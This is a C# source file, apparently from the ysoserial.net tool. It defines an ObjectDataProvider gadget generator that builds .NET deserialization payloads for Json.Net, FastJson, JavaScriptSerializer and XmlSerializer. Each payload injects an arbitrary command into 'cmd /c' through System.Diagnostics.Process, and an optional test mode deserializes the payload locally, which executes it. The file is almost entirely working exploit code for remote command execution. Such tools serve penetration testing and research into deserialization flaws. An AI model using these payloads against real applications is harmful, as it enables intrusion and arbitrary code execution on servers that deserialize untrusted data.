using System;
using System.Collections.Generic;
using System.IO;
using fastJSON;
using Newtonsoft.Json;
using System.Web.Script.Serialization;
using System.Xml;
using System.Xml.Serialization;

namespace ysoserial.Generators
{
    class ObjectDataProviderGenerator : GenericGenerator
    {
        public override string Description()
        {
            return "ObjectDataProvider Gadget by Oleksandr Mirosh and Alvaro Munoz";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer" };
        }

        public override string Name()
        {
            return "ObjectDataProvider";
        }

        public override object Generate(string cmd, string formatter, Boolean test)
        {
            if (formatter.ToLower().Equals("json.net"))
            {
                String payload = @"{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/c " + cmd + @"']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
                if (test)
                {
                    try
                    {
                        Object obj = JsonConvert.DeserializeObject<Object>(payload, new JsonSerializerSettings
                        {
                            TypeNameHandling = TypeNameHandling.Auto
                        }); ;
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("fastjson"))
            {
                String payload = @"{
    ""$types"":{
        ""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35"":""1"",
        ""System.Diagnostics.Process, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""2"",
        ""System.Diagnostics.ProcessStartInfo, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""3""
    },
    ""$type"":""1"",
    ""ObjectInstance"":{
        ""$type"":""2"",
        ""StartInfo"":{
            ""$type"":""3"",
            ""FileName"":""cmd"",
            ""Arguments"":""/c " + cmd + @"""
        }
    },
    ""MethodName"":""Start""
}";
                if (test)
                {
                    try
                    {
                        var instance = JSON.ToObject<Object>(payload);

                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("javascriptserializer"))
            {
                String payload = @"{
    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'ObjectInstance':{
        '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        'StartInfo': {
            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
            'FileName':'cmd',
            'Arguments':'/c " + cmd + @"'
        }
    }
}";
                if (test)
                {
                    try
                    {
                        JavaScriptSerializer jss = new JavaScriptSerializer(new SimpleTypeResolver());
                        var json_req = jss.Deserialize<Object>(payload);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("xmlserializer"))
            {
                String payload = $@"<?xml version=""1.0""?>
<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfXamlReaderObjectDataProvider>
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">
                    &lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;
                        &lt;ObjectDataProvider x:Key=&quot;LaunchCmd&quot; ObjectType=&quot;{{x:Type Diag:Process}}&quot; MethodName=&quot;Start&quot;&gt;
                            &lt;ObjectDataProvider.MethodParameters&gt;
                                &lt;System:String&gt;cmd&lt;/System:String&gt;
                                &lt;System:String&gt;/c {cmd}&lt;/System:String&gt;
                            &lt;/ObjectDataProvider.MethodParameters&gt;
                        &lt;/ObjectDataProvider&gt;
                    &lt;/ResourceDictionary&gt;
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type=""XamlReader""></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
";
                if (test)
                {
                    try
                    {
                        var xmlDoc = new XmlDocument();
                        xmlDoc.LoadXml(payload);
                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
                        var s = new XmlSerializer(Type.GetType(xmlItem.GetAttribute("type")));
                        var d = s.Deserialize (new XmlTextReader(new StringReader(xmlItem.InnerXml)));
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
